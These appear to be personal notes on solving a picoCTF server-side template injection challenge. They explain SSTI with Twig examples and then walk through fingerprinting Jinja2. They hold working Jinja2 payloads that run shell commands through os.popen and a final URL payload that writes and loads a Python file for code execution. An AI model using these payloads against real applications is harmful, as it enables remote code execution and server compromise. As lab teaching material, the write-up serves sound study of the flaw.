
this is an easy picoctf web challenge

basic explanation of SSTI:
what is a template?
https://en.wikipedia.org/wiki/Template_processor
lets you dynnamically generate html pages based on templates

lets you have dynamic content in a webpage with specific templating syntax

Server-side template injection vulnerabilities arise when user input is concatenated into templates rather than being passed in as data.


something like this would not be vulnerable to it (twig template)
`$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) );`
because the first name isn't passed into the template

if they directly put user input into the template before it renders, that might create vulns 
ex vuln code:
`$output = $twig->render("Dear " . $_GET['name'])`

for a more detailed explanation please look through [[my notes on SSTI's]]

How to solve it:


First I fuzzed the announce text input by inputting ```${{<%[%'"}}%\``` (these are normally used by templating engines) and seeing if that broke the page, it did so I concluded that there was a templating engine and it was evaluating all the things I input


then I followed the following flow chart


![[Pasted image 20251010003925.png]]
(the green arrow should be followed if the expression is sucessfuly evaluated and red if not)

to arrive at it being either jinja2 or twig

I tried running `{{ config.__class__ }}` (jinja2 syntax) and   `{{ constant('PHP_VERSION') }}` (twig syntax), the twig syntax broke the site while the jinja2 syntax worked so I concluded that it was using jinja2

I looked up jinja2 payloads to find ``self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()``
which worked (insert image)

I modified the command it would run on the system to `ls` (``self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read()``)

and then `cat flag
(`self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read()`)


which got me the flag


http://localhost:5000/?exploit={%set%20a,b,c,d,e,f,g,h,i%20=%20request.__class__.__mro__%}{{i.__subclasses__().pop(40)(request.args.file,request.args.write).write(request.args.payload)}}{{config.from_pyfile(request.args.file)}}&file=/tmp/foo.py&write=w&payload=print+1337


{%set%20a,b,c,d,e,f,g,h,i%20=%20request.__class__.__mro__%}{{i.__subclasses__().pop(40)(request.args.file,request.args.write).write(request.args.payload)}}{{config.from_pyfile(request.args.file)}}&file=/tmp/foo.py&write=w&payload=print+1337
